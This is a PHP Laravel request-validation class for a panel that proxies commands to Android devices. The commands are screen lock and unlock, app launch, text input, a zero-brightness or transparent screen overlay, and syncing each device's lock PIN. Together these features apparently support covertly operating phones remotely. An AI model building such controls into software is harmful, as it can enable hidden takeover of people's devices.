<?php

declare(strict_types=1);

namespace App\Http\Requests\Device;

use Illuminate\Foundation\Http\FormRequest;
use Illuminate\Validation\Rule;

class DeviceProxyRequest extends FormRequest
{
    public const ALLOWED_PATHS = [
        '/global/action',
        '/global/lockScreen',
        '/global/wakeUpScreen',
        '/global/setText',
        '/unlock',
        '/startApp',
        '/blockView',
        '/syncLockCipher',
    ];

    public function authorize(): bool
    {
        return true;
    }

    public function rules(): array
    {
        $rules = [
            'method' => ['required', Rule::in(['GET', 'POST'])],
            'path' => ['required', 'string', 'regex:/^\/[a-zA-Z\/]+$/', Rule::in(self::ALLOWED_PATHS)],
            'query' => ['nullable', 'array'],
            'query.*' => ['nullable', 'string', 'max:1024'],
            'body' => ['nullable', 'array'],
        ];

        if ($this->input('path') === '/syncLockCipher') {
            $rules['body.textCipher'] = ['required', 'string', 'regex:/^\d{4,16}$/'];
            $rules['body.deviceId'] = ['required', 'string', 'max:64'];
        }

        if ($this->input('path') === '/startApp') {
            $rules['query.packageName'] = [
                'required',
                'string',
                'regex:/^[a-zA-Z][a-zA-Z0-9_]*(\.[a-zA-Z][a-zA-Z0-9_]*)+$/',
                'max:255',
            ];
            $rules['query.start'] = ['nullable', 'string', Rule::in(['true', 'false'])];
        }

        if ($this->input('path') === '/global/action') {
            $rules['body.actionName'] = [
                'required',
                'string',
                Rule::in(['back', 'home', 'recent']),
            ];
        }

        if ($this->input('path') === '/blockView') {
            $boolRule = ['nullable', 'string', Rule::in(['true', 'false'])];
            $rules['query.show'] = $boolRule;
            $rules['query.transparent'] = $boolRule;
            $rules['query.zeroBrightness'] = $boolRule;
            $rules['query.destroyLock'] = $boolRule;
            $rules['query.hint'] = ['nullable', 'string', 'max:200'];
        }

        return $rules;
    }

    public function messages(): array
    {
        return [
            'path.in' => 'Path not allowed by panel proxy whitelist',
            'path.regex' => 'Path contains invalid characters',
            'method.in' => 'Only GET and POST are supported by this proxy',
            'body.textCipher.regex' => 'textCipher must be 4-16 digits',
            'body.actionName.in' => 'actionName must be one of: back, home, recent',
            'query.packageName.regex' => 'packageName must be a valid Android package identifier',
        ];
    }
}
